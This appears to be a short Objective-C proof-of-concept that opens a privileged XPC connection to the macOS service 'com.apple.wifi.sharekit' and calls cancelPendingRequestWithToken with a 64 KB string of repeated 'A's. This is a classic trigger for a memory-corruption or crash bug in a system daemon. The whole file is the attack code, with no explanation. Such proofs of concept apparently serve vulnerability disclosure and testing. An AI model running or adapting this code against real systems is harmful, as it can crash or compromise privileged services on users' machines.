#include <stdio.h>
#include <stdlib.h>

#import <objc/objc.h>
#import <objc/runtime.h>

#import <Foundation/Foundation.h>
#include <CoreFoundation/CoreFoundation.h>

@protocol MyProtocol
- (void) cancelPendingRequestWithToken:(NSString*)arg0 reply:(NSString*)arg1;
@end

int main() {
  NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.wifi.sharekit" options:NSXPCConnectionPrivileged];
  [conn setRemoteObjectInterface: [NSXPCInterface interfaceWithProtocol: @protocol(MyProtocol)]];
  [conn resume];

  id obj = [conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
    NSLog(@"got an error: %@", err);
  }];
  [obj retain];
  NSLog(@"obj: %@", obj);
  NSLog(@"conn: %@", conn);

  int size = 0x10000;
  char* long_cstring = malloc(size);
  memset(long_cstring, 'A', size-1);
  long_cstring[size-1] = 0;

  NSString* long_nsstring = [NSString stringWithCString:long_cstring encoding:NSASCIIStringEncoding];

  [obj cancelPendingRequestWithToken:long_nsstring reply:nil];
  gets(NULL);
  return 51;
}
